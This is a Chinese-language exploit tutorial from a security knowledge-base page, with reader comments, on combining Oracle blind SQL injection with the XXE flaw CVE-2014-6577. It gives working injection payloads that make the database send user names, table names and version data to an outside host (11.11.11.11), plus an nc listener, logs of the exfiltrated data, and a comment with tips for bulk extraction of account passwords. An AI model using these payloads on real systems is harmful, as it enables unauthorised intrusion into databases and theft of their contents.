@@ -1,0 +1,35 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Oracle盲注结合XXE漏洞远程获取数据</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">crackershi</a> <span class="bull">·</span> <time title="2015/05/12 16:24" ui-time="" datetime="2015/05/12 16:24" class="published ng-binding ng-isolate-scope">2015/05/12 16:24</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>想必大家对SQL注入已经耳熟能详，对XML实体注入（简称XXE）也有所了解。本文主要讨论了一种在存在ORACLE盲注的情况下远程获取数据的方式。其实和UTL_HTTP远程获取的方法差不多，只不过原理不同。</p><h1>0x01 漏洞简析</h1><hr><p>CVE-2014-6577，是Oracle在今年年初修补的XXE漏洞，已知受影响的范围：</p><p>11.2.0.3, 11.2.0.4, 12.1.0.1, 12.1.0.2，不排除那些已不受oracle支持的版本也存在此漏洞。攻击者可以通过利用构造SQL语句来触发XML解释器发送一个HTTP或者FTP请求，从而带来以下可能的威胁。</p><ul><li>数据泄露</li><li>SSRF</li><li>端口扫描</li><li>拒绝服务攻击。</li></ul><p>等等……</p><h1>0x02 漏洞利用</h1><hr><p>文献中给出的一个利用POC：</p><p>在远程主机上用nc监听21端口，当有连接后，输入220</p><pre><code>#!html
+select extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "ftp://'||user||':<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="80e2e1f2c0b1b1aeb1b1aeb1b1aeb1b1">[email&#160;protected]</a>/test"&gt; %remote; %param1;]&gt;'),'/l') from dual;
+</code></pre><p>and</p><pre><code>#!bash
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="9be9f4f4efdbf7f4f8faf7f3f4e8ef">[email&#160;protected]</a> httpd]# busybox nc -vvlp 21
+listening on [::]:21 ...
+connect to [::ffff:11.11.11.11]:21 from [::ffff:22.22.22.22]:37040 ([::ffff: 22.22.22.22]:37040)
+220
+USER XXXX _WEB_ XXXX
+220
+PASS bar
+^Csent 8, rcvd 33
+punt!
+</code></pre><p>在断开连接的同时，ORACLE会报以下错误</p><p>将把给出的POC变形，ftp请求换成http，</p><pre><code>ORA-31000: 资源 'ftp://XXXX_WEB_XXXX:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2b494a596b1a1a051a1a051a1a051a1a">[email&#160;protected]</a>/test' 不是 XDB 方案文档     
+
+ORA-06512: 在 "SYS.XMLTYPE", line 310     
+
+ORA-06512: 在 line 1
+…………
+</code></pre><p>and</p><pre><code>#!html
+select extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://11.11.11.11/'||user||'"&gt; %remote; %param1;]&gt;'),'/l') from dual
+</code></pre><p>这样不用启动nc或者ftp服务端即可在http日志中收到请求:</p><pre><code>#!bash
+22.22.22.22  - - [27/Apr/2015:07:56:53 -0400] "GET /XXXX_WEB_XXXX  HTTP/1.0" 404 294 "-" "-"
+</code></pre><h1>0x03 漏洞实战</h1><hr><p>某个搜索功能存在SQL注入漏洞</p><p>可以判断存在盲注，而且数据库基本能确定为oracle</p><pre><code>XXX%'and 233=233 '%'='              页面正常
+XXX%'and 233=2333 '%'='             页面无结果
+XXX%'and 1=(select 1 from dual) '%'='   页面正常
+</code></pre><p>构造如下语句 服务器收到如下请求：</p><pre><code>#!html
+XXX%'and 1=(select extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://11.11.11.11/'||(SELECT TABLE_NAME FROM (SELECT ROWNUM AS R,TABLE_NAME FROM USER_TABLES) WHERE R=1)||'"&gt; %remote; %param1;]&gt;'),'/l') from dual) and '%'='
+</code></pre><p>and</p><pre><code>22.22.22.22 - - [27/Apr/2015:22:00:46 -0400] "GET /EC_COMP_BINARY_INFO HTTP/1.0" 404 297 "-" "-"
+</code></pre><p>还可以这么构造，一次返回数条结果</p><p>服务器收到如下请求：</p><p>对于结果中带空白符或者其他特殊符号的，在此处Oracle并不会自动URL编码，所以为了顺利的获得数据可以用oracle的自带函数utl&#95;raw.cast&#95;to_raw()将结果转换为HEX。</p><pre><code>22.22.22.22 - - [27/Apr/2015:23:12:01 -0400] "GET /EC_COMP_BINARY_INFO////EC_COMP_BINARY_MAPPING HTTP/1.0" 404 323 "-" "-"
+</code></pre><p>and</p><pre><code>#!sql
+XXX%'and 1=(select extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://11.11.11.11/'||(SELECT utl_raw.cast_to_raw(BANNER) FROM (SELECT ROWNUM AS R,BANNER FROM v$version) WHERE R=1)||'////'||(SELECT utl_raw.cast_to_raw(BANNER) FROM (SELECT ROWNUM AS R,BANNER FROM v$version) WHERE R=2)||'"&gt; %remote; %param1;]&gt;'),'/l') from dual) and '%'='
+</code></pre><p>收到的请求：</p><p>经过HEX解码可得</p><pre><code>/Oracle Database 11g Enterprise Edition Release 11.2.0.2.0 - 64bit Production////PL/SQL Release 11.2.0.2.0 - Production
+
+22.22.22.22 - - [28/Apr/2015:03:50:16 -0400] "GET /4F7261636C652044617461626173652031316720456E74657270726973652045646974696F6E2052656C656173652031312E322E302E322E30202D2036346269742050726F64756374696F6E////504C2F53514C2052656C656173652031312E322E302E322E30202D2050726F64756374696F6E HTTP/1.0" 404 510 "-" "-"
+</code></pre><h1>参考文献：</h1><hr><p>https://blog.netspi.com/advisory-xxe-injection-oracle-database-cve-2014-6577/</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">牛肉包子</span> <span class="reply-time">2015-05-12 23:37:52</span></div><p></p><p>@Ricter 刚刚看完 我还想去测试mysql 既然你搞了 就不去了 哈哈</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sin</span> <span class="reply-time">2015-05-12 23:21:37</span></div><p></p><p>和作者看来测试到一块去了。11g和12g因为安全原因，只有dba权限才能向外通过http等传输数据。而这个xxe漏洞则完全绕开了高版本权限限制。普通权限即可快速获得大量敏感数据。<br>顺便提2个自己的小技巧吧。<br>在内网中可以用python -m SimpleHTTPServer 443迅速一个webserver。然后oracle xxe数据可以在日志上清晰看到。<br>同时为了获得大量数据，可以用特定函数一次全部列，或者rownum&lt;50的帐号密码等，oracle和mssql这样的函数还是挺多的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2015-05-12 18:33:57</span></div><p></p><p>这个xxe能读取本地文件到外地么</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ricter</span> <span class="reply-time">2015-05-12 16:57:42</span></div><p></p><p>哈，我原来就想过 MySQL 的这种 XXE，并测试过。当然，并没有漏洞存在。<br>没想到 Oracle 居然存在，真的是和一个 0day 失之交臂了。</p><p></p></div></div></div></div></div></main>
